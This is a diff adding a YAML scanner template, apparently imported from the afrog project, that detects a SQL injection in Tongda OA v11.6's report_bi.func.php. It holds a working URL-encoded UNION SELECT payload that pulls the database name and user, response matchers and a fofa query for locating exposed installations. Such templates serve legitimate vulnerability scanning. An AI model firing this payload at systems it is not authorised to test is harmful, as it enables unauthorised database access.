@@ -1,0 +1,33 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"col":'
+          - '"td_oa"'
+          - '"target":'
+          - '"para":'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/general/bi_design/appcenter/report_bi.func.php'
+id: tongda-report-bi-func-sqli
+info:
+  author: zan8in
+  description: |
+    通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息
+    fofa: app="TDXK-通达OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+  severity: critical
+  tags: tongda,oa,report,bi,func,sqli,argus-import
